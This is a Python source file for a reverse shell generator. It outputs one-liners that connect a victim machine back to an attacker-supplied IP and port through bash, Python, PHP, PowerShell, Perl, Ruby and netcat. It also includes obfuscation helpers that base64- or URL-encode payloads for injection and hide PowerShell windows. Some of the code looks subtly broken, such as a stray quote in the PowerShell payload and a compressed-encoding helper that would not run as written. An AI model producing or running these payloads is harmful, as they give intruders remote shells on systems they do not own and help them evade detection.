import base64
import urllib.parse
import zlib
import base64 as b64

class ReverseShellGenerator:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    # -----------------------
    # Core Payloads
    # -----------------------
    def bash(self):
        return f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"

    def python3(self):
        return (
            f"python3 -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{self.ip}\",{self.port}));"
            f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        )

    def php(self):
        return [
            f"<?php $sock=fsockopen(\"{self.ip}\",{self.port});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
            f"php -r '$sock=fsockopen(\"{self.ip}\",{self.port});exec(\"sh <&3 >&3 2>&3\");'"
        ]

    def powershell(self):
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"$client=New-Object System.Net.Sockets.TCPClient('{self.ip}',{self.port});"
            f"$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
            f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;"
            f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback=(iex $data 2>&1 | Out-String );"
            f"$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";"
            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}'"
        )

    def perl(self):
        return f"perl -e 'use Socket;$i=\"{self.ip}\";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

    def ruby(self):
        return f"ruby -rsocket -e'f=TCPSocket.open(\"{self.ip}\",{self.port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    def nc(self):
        return f"nc -e /bin/sh {self.ip} {self.port}"

    def nctraditional(self):
        return f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.ip} {self.port} > /tmp/f"

    # -----------------------
    # Obfuscation Features
    # -----------------------
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Encode payload in Base64"""
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def url_encode(payload: str) -> str:
        """Encode payload for URL injection"""
        return urllib.parse.quote(payload)

    @staticmethod
    def powershell_compressed(payload: str) -> str:
        """Compress + base64 encode a PowerShell command"""
        compressed = b64.b64encode(zlib.compress(payload.encode("utf-16le"))).decode()
        return f"powershell -nop -w hidden -enc {compressed}"

    # -----------------------
    # Bundle
    # -----------------------
    def all_payloads(self):
        payloads = {
            "Bash": self.bash(),
            "Python3": self.python3(),
            "PHP": self.php(),
            "PowerShell": self.powershell(),
            "Perl": self.perl(),
            "Ruby": self.ruby(),
            "Netcat": self.nc(),
            "Netcat (mkfifo)": self.nctraditional(),
        }
        return payloads
